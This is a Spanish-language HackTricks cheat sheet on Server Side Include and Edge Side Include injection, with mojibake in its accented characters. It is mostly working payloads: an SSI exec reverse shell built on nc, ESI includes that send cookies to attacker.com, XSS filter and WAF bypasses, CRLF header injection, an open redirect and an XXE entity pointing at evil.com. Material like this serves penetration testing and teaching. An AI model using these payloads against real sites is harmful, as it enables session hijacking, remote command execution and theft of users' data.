# Inclusi칩n del Lado del Servidor/Inclusi칩n del Lado del Borde

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n [**art칤culos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Informaci칩n B치sica sobre la Inclusi칩n del Lado del Servidor

**(Introducci칩n tomada de [la documentaci칩n de Apache](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) son directivas que se **colocan en p치ginas HTML y se eval칰an en el servidor** mientras las p치ginas se est치n sirviendo. Te permiten **agregar contenido generado din치micamente** a una p치gina HTML existente, sin tener que servir toda la p치gina a trav칠s de un programa CGI u otra tecnolog칤a din치mica.\
Por ejemplo, podr칤as colocar una directiva en una p치gina HTML existente, como:

`<!--#echo var="DATE_LOCAL" -->`

Y, cuando se sirva la p치gina, este fragmento ser치 evaluado y reemplazado con su valor:

`Martes, 15-Ene-2013 19:28:54 EST`

La decisi칩n de cu치ndo usar SSI, y cu치ndo tener tu p치gina generada completamente por alg칰n programa, suele ser una cuesti칩n de cu치nto de la p치gina es est치tico y cu치nto necesita ser recalculado cada vez que se sirve la p치gina. SSI es una excelente manera de agregar peque침os fragmentos de informaci칩n, como la hora actual - mostrada arriba. Pero si la mayor칤a de tu p치gina se est치 generando en el momento en que se sirve, necesitas buscar alguna otra soluci칩n.

Puedes inferir la presencia de SSI si la aplicaci칩n web utiliza archivos con las extensiones \*\* `.shtml`, `.shtm` o `.stm`\*\*, pero no es el 칰nico caso.

Una expresi칩n SSI t칤pica tiene el siguiente formato:
```
<!--#directive param="value" -->
```
### Verificaci칩n
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Inclusi칩n en el Borde

Existe un problema al **almacenar en cach칠 informaci칩n o aplicaciones din치micas** ya que parte del contenido puede haber **variado** para la pr칩xima vez que se recupere el contenido. Para esto se utiliza **ESI**, para indicar mediante etiquetas ESI el **contenido din치mico que debe generarse** antes de enviar la versi칩n en cach칠.\
si un **atacante** es capaz de **inyectar una etiqueta ESI** dentro del contenido en cach칠, entonces, podr칤a ser capaz de **inyectar contenido arbitrario** en el documento antes de que se env칤e a los usuarios.

### Detecci칩n de ESI

El siguiente **encabezado** en una respuesta del servidor significa que el servidor est치 utilizando ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Si no puedes encontrar este encabezado, el servidor **podr칤a estar utilizando ESI de todos modos**.\
Tambi칠n se puede utilizar un enfoque de **explotaci칩n a ciegas** ya que una solicitud deber칤a llegar al servidor del atacante:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### Explotaci칩n de ESI

[GoSecure cre칩](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) una tabla para entender los posibles ataques que podemos intentar contra diferentes software capaces de ESI, dependiendo de la funcionalidad admitida:

* **Includes**: Admite la directiva `<esi:includes>`
* **Vars**: Admite la directiva `<esi:vars>`. 칔til para evadir los filtros XSS
* **Cookie**: Las cookies del documento son accesibles para el motor ESI
* **Se Requieren Encabezados de Origen**: Las aplicaciones sustitutas no procesar치n las declaraciones ESI a menos que la aplicaci칩n de origen proporcione los encabezados
* **Lista Blanca de Hosts**: En este caso, las inclusiones de ESI solo son posibles desde los hosts de servidor permitidos, lo que hace que, por ejemplo, SSRF solo sea posible contra esos hosts

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Se Requieren Encabezados de Origen** | **Lista Blanca de Hosts** |
| :--------------------------: | :----------: | :------: | :---------: | :-------------------------------------: | :------------------------: |
|            Squid3            |      S칤      |    S칤    |     S칤      |                 S칤                     |           No               |
|         Varnish Cache        |      S칤      |    No    |      No     |                 S칤                     |           S칤               |
|            Fastly            |      S칤      |    No    |      No     |                 No                     |           S칤               |
| Akamai ESI Test Server (ETS) |      S칤      |    S칤    |     S칤      |                 No                     |           No               |
|          NodeJS esi          |      S칤      |    S칤    |     S칤      |                 No                     |           No               |
|         NodeJS nodesi        |      S칤      |    No    |      No     |                 No                     |        Opcional            |

#### XSS

La siguiente directiva ESI cargar치 un archivo arbitrario dentro de la respuesta del servidor
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Saltar la protecci칩n XSS del cliente
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Robar Cookie

* Robo remoto de cookie
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Robar la cookie HTTP\_ONLY con XSS al reflejarla en la respuesta:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Archivo local privado

No confundir con una "Inclusi칩n de archivo local":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Redirecci칩n Abierta

Lo siguiente agregar치 un encabezado `Location` a la respuesta
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Agregar Encabezado

* Agregar encabezado en solicitud forzada
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Agregar encabezado en la respuesta (칰til para evadir "Content-Type: text/json" en una respuesta con XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF en Agregar encabezado (**CVE-2019-2438)**
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Depuraci칩n de Akamai

Esto enviar치 informaci칩n de depuraci칩n incluida en la respuesta:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Al especificar el valor `xslt` para el par치metro _dca_, es factible incluir ESI basado en **`Transformaciones de Lenguaje de Hoja de Estilo Extensible (XSLT)`**. La inclusi칩n hace que el servidor HTTP recupere los archivos XML y XSLT, siendo este 칰ltimo el que filtra el primero. Estos archivos XML son explotables para ataques de _Entidades Externas XML (XXE)_, lo que permite a los atacantes ejecutar ataques SSRF. Sin embargo, la utilidad de este enfoque es limitada ya que las inclusiones de ESI ya sirven como un vector SSRF. Debido a la falta de soporte en la biblioteca subyacente Xalan, los DTD externos no se procesan, lo que evita la extracci칩n de archivos locales.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
Archivo XSLT:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Revisa la p치gina XSLT:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Referencias

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Lista de Detecci칩n de Fuerza Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
